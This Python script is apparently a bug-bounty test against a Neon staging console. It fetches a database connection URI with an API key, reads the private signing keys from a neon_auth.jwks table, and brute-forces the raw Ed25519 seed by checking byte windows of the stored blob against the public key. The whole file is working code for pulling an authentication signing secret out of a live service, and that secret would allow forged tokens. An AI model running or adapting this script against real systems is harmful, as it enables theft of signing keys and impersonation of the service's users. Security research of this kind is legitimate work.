# -*- coding: utf-8 -*-
"""V26d: sliding-window brute of 169-byte blob for the Ed25519 seed (32B window)"""
import json, ssl, time, http.client, base64

ctx = ssl.create_default_context()
import psycopg
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
             "?database_name=neondb&role_name=neondb_owner"
             "&branch_id=br-wandering-field-w2ob6mpn",
             headers={"X-Bug-Bounty": "xxbo",
                      "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
r = conn.getresponse()
uri = json.loads(r.read().decode())["uri"]
conn.close()
p = urlsplit(uri)
q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
with psycopg.connect(uri2, connect_timeout=15) as dbc:
    dbc.autocommit = True
    with dbc.cursor() as cur:
        cur.execute('SELECT "privateKey", "publicKey" FROM neon_auth.jwks')
        priv, pub = cur.fetchone()
blob = bytes.fromhex(json.loads(priv))
pubx = json.loads(pub)["x"]
def b64u(raw):
    return base64.b64encode(raw).decode().replace("+", "-").replace("/", "_").rstrip("=")
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization
print("blob len", len(blob))
found = None
for i in range(len(blob) - 31):
    seed = blob[i:i + 32]
    try:
        sk = Ed25519PrivateKey.from_private_bytes(seed)
        pk = sk.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
        if b64u(pk) == pubx:
            found = (i, seed.hex())
            print("FOUND seed at offset %d: %s" % (i, seed.hex()))
            break
    except Exception:
        pass
if not found:
    print("no 32B window matches - key is not raw seed in blob (likely encrypted/derived)")
# also try 64B windows (seed||pub) trimming pub part
for i in range(len(blob) - 63):
    cand = blob[i:i + 64]
    for cut in (32,):
        try:
            sk = Ed25519PrivateKey.from_private_bytes(cand[:cut])
            pk = sk.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
            if b64u(pk) == pubx:
                print("FOUND 64B-window seed at %d" % i)
                found = (i, cand[:cut].hex())
                break
        except Exception:
            pass
    if found:
        break
print("result:", found[1] if found else None)
